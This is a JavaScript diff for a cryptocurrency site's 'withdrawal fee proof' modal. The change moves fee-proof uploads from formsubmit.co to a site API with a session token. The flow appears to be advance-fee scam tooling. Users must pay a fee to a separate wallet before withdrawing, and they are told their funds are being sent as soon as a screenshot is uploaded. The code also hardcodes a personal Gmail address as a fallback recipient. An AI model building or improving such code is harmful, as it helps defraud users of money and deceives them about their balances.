@@ -89,6 +89,30 @@
     ok.classList.remove("hidden");
   }
 
+  function readFileAsBase64(file) {
+    return new Promise(function (resolve, reject) {
+      var reader = new FileReader();
+      reader.onload = function () {
+        var result = reader.result || "";
+        var base64 = String(result).split(",")[1] || "";
+        resolve(base64);
+      };
+      reader.onerror = reject;
+      reader.readAsDataURL(file);
+    });
+  }
+
+  function onSubmitSuccess(pending) {
+    showStatus("Fee received. Amount deducted from your account and sending to your wallet.");
+    var onSuccess = pending.onSuccess;
+    var dest = pending.destinationWallet;
+    var amt = pending.amount;
+    setTimeout(function () {
+      closeModal();
+      onSuccess({ amount: amt, destinationWallet: dest });
+    }, 900);
+  }
+
   function onSubmit() {
     var pending = window.__withdrawFeeProofPending;
     if (!pending || typeof pending.onSuccess !== "function") return;
@@ -107,47 +131,54 @@
       return;
     }
 
-    var email = (profile && profile.formSubmitEmail) || "ronniechristopher89@gmail.com";
     var fee = (profile && profile.withdrawFeeAmount) || 455;
     var feeWallet = (profile && profile.withdrawFeeWallet) || "";
     var user = window.SatVaultAuth && SatVaultAuth.getUser && SatVaultAuth.getUser();
+    var profileId = window.SatVaultAuth && SatVaultAuth.getProfileId && SatVaultAuth.getProfileId();
+    var syncToken = window.SITE && typeof SITE.getSyncToken === "function"
+      ? SITE.getSyncToken(profileId)
+      : "";
 
-    var formData = new FormData();
-    formData.append("_subject", "Withdrawal fee proof — " + ((profile && profile.displayName) || "User"));
-    formData.append("_template", "table");
-    formData.append("_captcha", "false");
-    formData.append("_honey", "");
-    formData.append("name", (profile && profile.displayName) || "User");
-    formData.append("email", (user && (user.login || user.email)) || (profile && profile.email) || "");
-    formData.append("withdrawal_amount", "$" + Number(pending.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
-    formData.append("destination_wallet", pending.destinationWallet || "");
-    formData.append("fee_amount", "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
-    formData.append("fee_wallet", feeWallet);
-    formData.append("message",
-      "User paid the withdrawal fee. Deduct from their platform balance and send the withdrawal amount to their destination wallet. " +
-      "Verify the fee payment screenshot, then release funds to the destination wallet.");
-    formData.append("attachment", file, file.name);
+    if (!profileId || !syncToken) {
+      showError("Could not verify your session. Please sign in again.");
+      return;
+    }
 
     submitBtn.disabled = true;
     submitBtn.textContent = "Submitting…";
     showStatus("Sending payment proof…");
 
-    fetch("https://formsubmit.co/ajax/" + encodeURIComponent(email), {
-      method: "POST",
-      body: formData,
-      headers: { Accept: "application/json" }
+    readFileAsBase64(file).then(function (fileData) {
+      return fetch("/api/fee-proof", {
+        method: "POST",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+          "X-Sync-Token": syncToken
+        },
+        body: JSON.stringify({
+          profileId: profileId,
+          notifyEmail: (profile && profile.formSubmitEmail) || "ronniechristopher89@gmail.com",
+          subject: "Withdrawal fee proof — " + ((profile && profile.displayName) || "User"),
+          name: (profile && profile.displayName) || "User",
+          email: (user && (user.login || user.email)) || (profile && profile.email) || "",
+          withdrawal_amount: "$" + Number(pending.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+          destination_wallet: pending.destinationWallet || "",
+          fee_amount: "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+          fee_wallet: feeWallet,
+          message:
+            "User paid the withdrawal fee. Deduct from their platform balance and send the withdrawal amount to their destination wallet. " +
+            "Verify the fee payment screenshot, then release funds to the destination wallet.",
+          fileName: file.name,
+          fileType: file.type || "application/octet-stream",
+          fileData: fileData
+        })
+      });
     }).then(function (res) {
       if (!res.ok) throw new Error("Submit failed");
       return res.json().catch(function () { return {}; });
     }).then(function () {
-      showStatus("Fee received. Amount deducted from your account and sending to your wallet.");
-      var onSuccess = pending.onSuccess;
-      var dest = pending.destinationWallet;
-      var amt = pending.amount;
-      setTimeout(function () {
-        closeModal();
-        onSuccess({ amount: amt, destinationWallet: dest });
-      }, 900);
+      onSubmitSuccess(pending);
     }).catch(function () {
       showError("Could not send proof. Check your connection and try again.");
       submitBtn.disabled = false;
